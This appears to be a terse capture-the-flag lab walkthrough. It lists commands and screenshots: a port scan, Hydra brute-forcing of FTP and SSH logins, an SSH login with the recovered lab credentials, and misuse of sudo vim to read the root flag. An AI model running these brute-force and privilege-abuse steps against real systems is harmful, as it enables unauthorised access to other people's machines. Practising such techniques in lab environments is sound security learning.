```bash
sudo nmap -p1-5000 -r -Pn -A 0.0.0.0
```

![[Captura desde 2024-09-04 21-35-33.png]]

```bash
sudo hydra -C /usr/share/wordlists/legion/ftp-betterdefaultpasslist.txt ftp://10.10.166.50 -V -t 50 > cap.txt
```

```bash
grep 'host:' cap.txt
```

![[Captura desde 2024-09-04 21-44-35.png]]

```bash
ftp 0.0.0.0 -A
```

![[Captura desde 2024-09-04 21-50-04.png]]

Username: `mitch`

```bash
find /usr/share -type f -name "best110.txt"
```

![[Captura desde 2024-09-04 21-59-07.png]]

```bash
hydra -l mitch -P /usr/share/dirb/wordlists/others/best110.txt 0.0.0.0 ssh -s 2222 -t 4 -V > cap2.txt
```

```bash
grep 'host:' cap2.txt
```

![[Captura desde 2024-09-04 22-22-40.png]]

Username: `mitch`
Password: `secret`

```bash
ssh mitch@10.10.166.50 -p 2222
```

```bash
sudo -l
```

![[Captura desde 2024-09-04 22-25-59.png]]

```bash
sudo vim user.txt
```

![[Captura desde 2024-09-04 22-29-55.png]]

```bash
sudo vim /root/root.txt
```

![[Captura desde 2024-09-04 22-33-57.png]]